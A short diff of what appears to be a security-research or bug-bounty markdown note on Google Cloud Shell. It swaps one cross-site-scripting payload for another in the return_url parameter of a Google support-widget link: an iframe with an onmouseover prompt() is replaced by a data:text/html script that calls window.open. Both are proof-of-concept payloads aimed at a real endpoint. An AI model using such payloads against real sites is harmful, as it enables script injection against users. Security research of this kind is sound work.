@@ -28,7 +28,7 @@ https://970-cs-202608506355-default.cs-asia-southeast1-ajrg.cloudshell.dev/mini-
 =========
 
 > hello <a name='n'
-> href='https://apps.google.com/supportwidget/sessionexpired?session_id=3E8233CD-A1B9-4C5F-9BAD-2868B79624C6&product_context&product_name=Cloud Platform&return_url=data%3Atext%2Fhtml%2C%3Ciframe%20sandbox%3D%22allow-same-origin%20allow-top-navigation%20allow-modals%20allow-scripts%22%20scrolling%3D%22yes%22%20src%3D%22https%3A%2F%2Fapps.google.com%2Fsupportwidget%2Fsessionexpired%3Fsession_id%3D3E8233CD-A1B9-4C5F-9BAD-2868B79624C6%26product_context%26product_name%3DCloud%20Platform%26return_url%3Ddata%3Atext%2Fhtml%2C%3Ch1%2Fonmouseover%3Dprompt()%3Etest%22%20width%3D%22100%25%22%20height%3D%22100%25%22%3E'>*apps*</a>\
+> href='https://apps.google.com/supportwidget/sessionexpired?session_id=3E8233CD-A1B9-4C5F-9BAD-2868B79624C6&product_context&product_name=Cloud Platform&return_url=data:text/html,<script>window.open("", "", "width=300,height=300");</script>'>*apps*</a>\
 
 
 =============
